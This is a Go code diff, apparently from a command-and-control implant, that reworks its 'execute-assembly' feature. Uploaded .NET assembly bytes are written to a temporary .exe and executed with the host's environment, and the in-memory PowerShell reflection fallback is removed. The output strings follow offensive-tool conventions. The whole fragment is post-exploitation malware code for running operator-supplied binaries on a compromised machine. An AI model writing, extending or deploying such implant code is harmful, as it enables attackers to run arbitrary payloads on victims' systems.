@@ -80,9 +80,12 @@ Usage:
 		}
 	}
 
-	// If data provided (uploaded assembly bytes)
+	// If data provided (uploaded assembly bytes) — write to temp and execute
 	if len(data) > 0 {
-		return executeAssemblyInMemory(data, args)
+		tmpPath := filepath.Join(os.TempDir(), "asm_"+fmt.Sprintf("%d", len(data))+".exe")
+		os.WriteFile(tmpPath, data, 0755)
+		defer os.Remove(tmpPath)
+		return executeAssemblyFromFile(tmpPath, args)
 	}
 
 	// If path provided
@@ -103,21 +106,20 @@ Usage:
 
 // Execute .NET assembly from file
 func executeAssemblyFromFile(path string, args []string) ([]byte, error) {
-	// Method 1: Direct execution
-	cmdArgs := append([]string{path}, args...)
-	cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)
+	// Direct execution — run the .exe with arguments
+	cmd := exec.Command(path, args...)
+	cmd.Env = os.Environ()
 	out, err := cmd.CombinedOutput()
-	if err == nil {
+
+	if len(out) > 0 {
 		return append([]byte(fmt.Sprintf("[+] Assembly executed: %s %s\n\n", filepath.Base(path), strings.Join(args, " "))), out...), nil
 	}
 
-	// Method 2: Via PowerShell reflection (in-memory)
-	assemblyData, readErr := os.ReadFile(path)
-	if readErr != nil {
-		return out, err
+	if err != nil {
+		return []byte(fmt.Sprintf("[-] Assembly execution failed: %v\n[*] Try running manually: %s %s", err, path, strings.Join(args, " "))), err
 	}
 
-	return executeAssemblyInMemory(assemblyData, args)
+	return []byte("[*] Assembly executed but produced no output"), nil
 }
 
 // Execute .NET assembly in-memory via PowerShell reflection
